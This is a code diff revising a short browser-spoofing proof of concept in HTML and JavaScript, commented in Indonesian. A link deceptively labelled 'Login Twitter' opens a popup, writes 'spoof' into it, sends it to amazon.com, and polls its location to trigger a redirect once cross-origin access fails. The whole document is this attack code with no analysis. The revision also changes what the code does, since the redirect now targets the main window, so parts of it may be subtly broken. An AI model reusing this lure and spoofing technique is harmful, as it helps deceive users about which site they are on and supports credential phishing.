@@ -1,12 +1,34 @@
 <script>
   function next() {
-         w.location.replace('http://www.google.com/csi');
-        }
+    // Pindahkan ke URL yang baru setelah manipulasinya selesai.
+    window.location.replace('http://www.google.com/csi');
+  }
 
   function f() {
-    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+    // Membuka jendela baru, mengisi dengan "spoof", dan kemudian mengarahkannya ke amazon.com
+    var w = window.open("about:blank", "new", "width=500,height=500");
+    
+    // Menambahkan HTML ke jendela baru
+    w.document.write("<h1>spoof</h1>");
+
+    // Mengarahkan ke amazon setelah 1 detik
+    setTimeout(function() {
+      w.location = 'http://amazon.com';
+    }, 1000);
+
+    // Menggunakan setInterval untuk memeriksa location href
+    var i = setInterval(function() {
+      try {
+        // Mencoba memeriksa location.href
+        var x = w.location.href;
+      } catch(e) {
+        // Jika terjadi error, menghentikan interval dan melanjutkan ke URL lain
+        clearInterval(i);
+        next();
+      }
+    }, 100); // interval lebih cepat agar lebih responsif
   }
 </script>
 
+<!-- Link yang memicu fungsi f() saat diklik -->
 <a href="#" onclick="f()">Login Twitter</a>
